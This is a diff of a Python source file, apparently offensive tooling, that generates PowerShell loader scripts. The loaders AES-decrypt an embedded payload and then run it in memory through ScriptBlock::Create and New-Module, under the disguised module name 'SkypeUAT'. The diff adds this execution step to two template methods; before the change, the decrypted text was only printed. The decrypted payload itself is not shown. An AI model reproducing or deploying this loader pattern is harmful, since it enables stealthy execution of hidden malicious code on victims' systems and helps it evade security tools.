@@ -66,14 +66,18 @@ function dcc($key, $iv, $ct){{
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     $aesManaged.Dispose()
-    $unencryptedData.GetType()
-    $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
-    $a
+    $script:payload = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
 }}
 $key = "{encrypted_payload['key']}" 
 $ct = "{encrypted_payload['ciphertext']}"
 $iv = "{encrypted_payload['iv']}"
-$ggwp = dcc $key $iv $ct        
+$ggwp = dcc $key $iv $ct
+
+start-sleep 1
+$aa = [ScriptBlock]::Create($script:payload)
+New-Module -ScriptBlock $aa -Name "SkypeUAT" | Import-Module | out-null
+
+abcdef     
             '''
             return powershell_decryption
         except:
@@ -82,47 +86,51 @@ $ggwp = dcc $key $iv $ct
     def BACKUP_payload_decryption_wrapper(self, encrypted_payload):
             try:
                 powershell_decryption = f'''
-    function Create-AesManagedObject($key, $IV) {{
-        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        $aesManaged.BlockSize = 128
-        $aesManaged.KeySize = 256
-        if ($IV) {{
-            if ($IV.getType().Name -eq "String") {{
-                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-            }}
-            else {{
-                $aesManaged.IV = $IV
-            }}
+function Create-AesManagedObject($key, $IV) {{
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {{
+        if ($IV.getType().Name -eq "String") {{
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
         }}
-        if ($key) {{
-            if ($key.getType().Name -eq "String") {{
-                $aesManaged.Key = [System.Convert]::FromBase64String($key)
-            }}
-            else {{
-                $aesManaged.Key = $key
-            }}
+        else {{
+            $aesManaged.IV = $IV
         }}
-        $aesManaged
     }}
+    if ($key) {{
+        if ($key.getType().Name -eq "String") {{
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        }}
+        else {{
+            $aesManaged.Key = $key
+        }}
+    }}
+    $aesManaged
+}}
 
-    function dcc($key, $iv, $ct){{
-        $byte_ct = [System.Convert]::FromBase64String($ct)
-        $bytes = [System.Convert]::FromBase64String($ct)
-        $aesManaged = Create-AesManagedObject $key $iv
-        $decryptor = $aesManaged.CreateDecryptor();
-        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-        $aesManaged.Dispose()
-        $unencryptedData.GetType()
-        $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
-        $a
-    }}
-    $key = "{encrypted_payload['key']}" 
-    $ct = "{encrypted_payload['ciphertext']}"
-    $iv = "{encrypted_payload['iv']}"
-    $ggwp = dcc $key $iv $ct        
-                '''
+function dcc($key, $iv, $ct){{
+    $byte_ct = [System.Convert]::FromBase64String($ct)
+    $bytes = [System.Convert]::FromBase64String($ct)
+    $aesManaged = Create-AesManagedObject $key $iv
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $aesManaged.Dispose();
+    $script:payload = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
+}}
+$key = "{encrypted_payload['key']}" 
+$ct = "{encrypted_payload['ciphertext']}"
+$iv = "{encrypted_payload['iv']}"
+$ggwp = dcc $key $iv $ct
+
+start-sleep 1
+$aa = [ScriptBlock]::Create($script:payload)
+New-Module -ScriptBlock $aa -Name "SkypeUAT" | Import-Module | out-null
+
+abcdef
+'''
                 return powershell_decryption
             except:
                 return
